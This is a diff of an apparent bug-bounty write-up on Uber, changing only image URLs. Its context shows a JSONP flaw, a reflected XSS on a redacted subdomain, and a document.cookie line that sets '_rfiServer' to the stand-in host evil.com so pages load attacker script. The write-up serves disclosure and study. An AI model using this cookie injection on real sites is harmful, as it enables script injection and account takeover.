@@ -66,11 +66,11 @@
 },
 </code></pre></div></div>
 
-<p><img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg" /></p>
+<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe8cbagsj21d00r0gsw.jpg" /></p>
 
 <p>   Nothing suspicious? Not! When came cross these lines of code, I was thinking about whether the value of <code class="highlighter-rouge">this.rfiServer</code> could be controlled by me. If yes, we can force the browser to load arbitrary javascript file. To understand this, you should know the essence of JSONP. The next step was searching everything about <code class="highlighter-rouge">rfiServer</code>.</p>
 
-<p><img src="http://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg" /></p>
+<p><img src="https://wx3.sinaimg.cn/mw690/9c5c5d93ly1fxqe84lvb3j20tm0f042c.jpg" /></p>
 
 <p>After reading through these lines of code:</p>
 
@@ -94,13 +94,13 @@ null != a &amp;&amp; this.setRfiServer(a),
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document.cookie = '_rfiServer=evil.com;domain=.uber.com;expires=Sat, 27 Jan 2018 01:43:57 GMT;path=/'
 </code></pre></div></div>
 
-<p><img src="http://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg" /></p>
+<p><img src="https://wx1.sinaimg.cn/mw690/9c5c5d93ly1fxqe87abluj20yt0u0qel.jpg" /></p>
 
 <h2 id="xss-of-ubercom-which-is-out-of-scope">XSS of .uber.com which is Out of Scope</h2>
 
 <p>I did really find out one reflected XSS in one of Uber’s subdomain using search engine. Let’s call the domain <code class="highlighter-rouge">&lt;redacted&gt;.uber.com</code> for demo.</p>
 
-<p><img src="http://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg" /></p>
+<p><img src="https://wx4.sinaimg.cn/mw690/9c5c5d93ly1fxqe89pzq4j21dw0fy79z.jpg" /></p>
 
 <ol>
   <li><code class="highlighter-rouge">"</code> is reflected and not encoded. We can inject any attribution into <code class="highlighter-rouge">input</code> tag.</li>
